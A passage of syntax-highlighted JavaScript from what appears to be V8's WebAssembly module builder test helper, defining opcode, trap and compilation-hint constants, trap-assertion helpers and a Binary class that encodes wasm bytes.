      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF32x4S <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF32x4U <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x102</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF64x2SZero <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x103</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4RelaxedTruncF64x2UZero <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x104</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Qfma <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x105</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4Qfms <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x106</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Qfma <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x107</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2Qfms <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI8x16RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x109</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI64x2RelaxedLaneSelect <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4RelaxedMin <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF32x4RelaxedMax <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10e</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2RelaxedMin <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x10f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprF64x2RelaxedMax <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8RelaxedQ15MulRS <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI16x8DotI8x16I7x16S <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x112</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kExprI32x4DotI8x16I7x16AddS <span class="token operator">=</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token number">0x113</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// Compilation hint constants.</span>
      <span class="token keyword">let</span> kCompilationHintStrategyDefault <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCompilationHintStrategyLazy <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCompilationHintStrategyEager <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCompilationHintStrategyLazyBaselineEagerTopTier <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCompilationHintTierDefault <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCompilationHintTierBaseline <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCompilationHintTierOptimized <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapUnreachable <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapMemOutOfBounds <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapDivByZero <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapDivUnrepresentable <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapRemByZero <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapFloatUnrepresentable <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapTableOutOfBounds <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapFuncSigMismatch <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapUnalignedAccess <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapDataSegmentOutOfBounds <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapElementSegmentOutOfBounds <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapRethrowNull <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapArrayTooLarge <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapArrayOutOfBounds <span class="token operator">=</span> <span class="token number">13</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapNullDereference <span class="token operator">=</span> <span class="token number">14</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapIllegalCast <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kAtomicWaitOk <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kAtomicWaitNotEqual <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kAtomicWaitTimedOut <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token comment">// Exception handling with exnref.</span>
      <span class="token keyword">let</span> kCatchNoRef <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCatchRef <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCatchAllNoRef <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kCatchAllRef <span class="token operator">=</span> <span class="token number">0x3</span><span class="token punctuation">;</span>
      <span class="token keyword">let</span> kTrapMsgs <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"unreachable"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"memory access out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"divide by zero"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"divide result unrepresentable"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"remainder by zero"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"float unrepresentable in integer range"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"table index is out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"null function or function signature mismatch"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"operation does not support unaligned accesses"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"data segment out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"element segment out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"rethrowing null value"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"requested new array is too large"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"array element access out of bounds"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"dereferencing a null pointer"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
        <span class="token string">"illegal cast"</span><span class="token punctuation">,</span> <span class="token comment">// --</span>
      <span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token comment">// This requires test/mjsunit/mjsunit.js.</span>
      <span class="token keyword">function</span> <span class="token function">assertTraps</span><span class="token punctuation">(</span><span class="token parameter">trap<span class="token punctuation">,</span> code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">assertThrows</span><span class="token punctuation">(</span>
          code<span class="token punctuation">,</span>
          WebAssembly<span class="token punctuation">.</span>RuntimeError<span class="token punctuation">,</span>
          <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>kTrapMsgs<span class="token punctuation">[</span>trap<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">assertTrapsOneOf</span><span class="token punctuation">(</span><span class="token parameter">traps<span class="token punctuation">,</span> code</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> errorChecker <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>
          <span class="token string">"("</span> <span class="token operator">+</span> traps<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">trap</span><span class="token punctuation">)</span> <span class="token operator">=></span> kTrapMsgs<span class="token punctuation">[</span>trap<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">assertThrows</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> WebAssembly<span class="token punctuation">.</span>RuntimeError<span class="token punctuation">,</span> errorChecker<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">Binary</span> <span class="token punctuation">&#123;</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token parameter">needed</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">>=</span> needed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> new_capacity <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span>new_capacity <span class="token operator">-</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">&lt;</span> needed<span class="token punctuation">)</span> new_capacity <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> new_buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>new_capacity<span class="token punctuation">)</span><span class="token punctuation">;</span>
          new_buffer<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer <span class="token operator">=</span> new_buffer<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_u16</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_u32</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_leb_u</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span>max_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>
            val <span class="token operator">=</span> val <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v<span class="token punctuation">;</span>
              <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> v <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value exceeds maximum length of "</span> <span class="token operator">+</span> max_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_u32v</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_leb_u</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_u64v</span><span class="token punctuation">(</span><span class="token parameter">val</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_leb_u</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> kMaxVarInt64Size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">ensure_space</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>buffer<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>length <span class="token operator">+=</span> data<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_string</span><span class="token punctuation">(</span><span class="token parameter">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// When testing illegal names, we pass a byte array directly.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>string <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// This is the hacky way to convert a JavaScript string to a UTF8 encoded</span>
          <span class="token comment">// string only containing single-byte characters.</span>
          <span class="token keyword">let</span> string_utf8 <span class="token operator">=</span> <span class="token function">unescape</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>string_utf8<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> string_utf8<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>string_utf8<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_heap_type</span><span class="token punctuation">(</span><span class="token parameter">heap_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>heap_type<span class="token punctuation">,</span> kMaxVarInt32Size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_type</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> type <span class="token operator">==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span> type <span class="token operator">:</span> type <span class="token operator">&amp;</span> kLeb128Mask<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>opcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"depth"</span> <span class="token keyword">in</span> type<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>depth<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_heap_type</span><span class="token punctuation">(</span>type<span class="token punctuation">.</span>heap_type<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_init_expr</span><span class="token punctuation">(</span><span class="token parameter">expr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExprEnd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_header</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            kWasmH0<span class="token punctuation">,</span>
            kWasmH1<span class="token punctuation">,</span>
            kWasmH2<span class="token punctuation">,</span>
            kWasmH3<span class="token punctuation">,</span>
            kWasmV0<span class="token punctuation">,</span>
            kWasmV1<span class="token punctuation">,</span>
            kWasmV2<span class="token punctuation">,</span>
            kWasmV3<span class="token punctuation">,</span>
          <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">emit_section</span><span class="token punctuation">(</span><span class="token parameter">section_code<span class="token punctuation">,</span> content_generator</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token comment">// Emit section name.</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>section_code<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">// Emit the section to a temporary buffer: its full length isn't know yet.</span>
          <span class="token keyword">const</span> section <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">content_generator</span><span class="token punctuation">(</span>section<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">// Emit section length.</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>section<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token comment">// Copy the temporary buffer.</span>
          <span class="token comment">// Avoid spread because &#123;section&#125; can be huge.</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>section<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">class</span> <span class="token class-name">WasmFunctionBuilder</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// Encoding of local names: a string corresponds to a local name,</span>
        <span class="token comment">// a number n corresponds to n undefined names.</span>
        <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">module<span class="token punctuation">,</span> name<span class="token punctuation">,</span> type_index<span class="token punctuation">,</span> arg_names</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>module <span class="token operator">=</span> module<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>type_index <span class="token operator">=</span> type_index<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>body <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>locals <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>local_names <span class="token operator">=</span> arg_names<span class="token punctuation">;</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>body_offset <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span> <span class="token comment">// Not valid until module is serialized.</span>
        <span class="token punctuation">&#125;</span>
